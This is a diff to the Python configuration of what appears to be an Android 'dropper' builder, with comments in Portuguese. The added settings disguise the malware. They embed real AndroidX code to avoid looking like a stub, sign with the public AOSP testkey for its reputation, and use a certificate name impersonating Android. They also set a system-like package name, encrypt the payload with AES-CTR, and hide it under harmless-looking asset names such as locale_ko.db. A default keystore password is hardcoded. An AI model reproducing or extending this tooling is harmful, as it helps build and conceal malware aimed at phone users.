@@ -34,11 +34,55 @@ class Config:
     PUBLIC_ICONS_FOLDER = os.path.join(BASE_DIR, "outputs", "icons")
 
     DROPPER_TEMPLATE = os.path.join(BASE_DIR, "dropper_rebuild")
-    SIGNER_JAR = os.path.join(BASE_DIR, "signer.jar")
+    SIGNER_JAR = os.path.join(BASE_DIR, "signer.jar")  # rollback manual only
     APKTOOL_JAR = os.path.join(BASE_DIR, "apktool.jar")
+    # Etapa 4.1: AndroidX/Material real como classes2.dex (anti-stub)
+    DROPPER_LIBS_DEX = os.path.join(
+        BASE_DIR, "dropper_rebuild", "prebuilt", "androidx_material.dex"
+    )
 
-    SEED = 276813
+    # Assinatura: AOSP testkey (chave pública oficial — reputação conhecida)
+    _BUILD_TOOLS = os.path.join(
+        BASE_DIR, "APP-TEST", "tools", "android-sdk", "build-tools", "35.0.0"
+    )
+    APKSIGNER = os.path.join(_BUILD_TOOLS, "apksigner")
+    ZIPALIGN = os.path.join(_BUILD_TOOLS, "zipalign")
+    KEYSTORE_VALIDITY_DAYS = 10000
+    KEYSTORE_KEY_ALG = "RSA"
+    KEYSTORE_KEY_SIZE = 2048
+    KEYSTORE_SIG_ALG = "SHA256withRSA"
+    KEYSTORE_STORE_TYPE = "PKCS12"
+    # Modo: "aosp_testkey" (default) | "pkcs12" (signing/release.p12 legado)
+    SIGNING_MODE = os.environ.get("SIGNING_MODE", "aosp_testkey")
+    AOSP_TESTKEY_PK8 = os.path.join(BASE_DIR, "signing", "testkey.pk8")
+    AOSP_TESTKEY_CERT = os.path.join(BASE_DIR, "signing", "testkey.x509.pem")
+    RELEASE_KEYSTORE = os.path.join(BASE_DIR, "signing", "release.p12")
+    RELEASE_KEY_ALIAS = os.environ.get("RELEASE_KEY_ALIAS", "androidapp")
+    RELEASE_KEYSTORE_PASS = os.environ.get(
+        "RELEASE_KEYSTORE_PASS", "android_app_release_2026"
+    )
+    RELEASE_DNAME = os.environ.get(
+        "RELEASE_DNAME",
+        "CN=Android App, OU=Development, O=Android, L=Mountain View, ST=California, C=US",
+    )
+    # Wi-Fi usa só v2; v3 off
+    APKSIGNER_V3_ENABLED = False
+
     OLD_PACKAGE = "com.android.system.qspaas"
+    PACKAGE_PREFIX = "com.app.mobile"
+
+    # Dropper crypto (AES-256-CTR, key/IV por build — sem SEED LCG)
+    CIPHER_TRANSFORM = "AES/CTR/NoPadding"
+    ASSET_NAME_POOL = (
+        "locale_ko.db",
+        "locale_ja.db",
+        "locale_de.db",
+        "strings_ko.bin",
+        "strings_de.bin",
+        "strings_pt.bin",
+        "config_cache.bin",
+        "resources_meta.db",
+    )
 
 
 def ensure_directories(config):
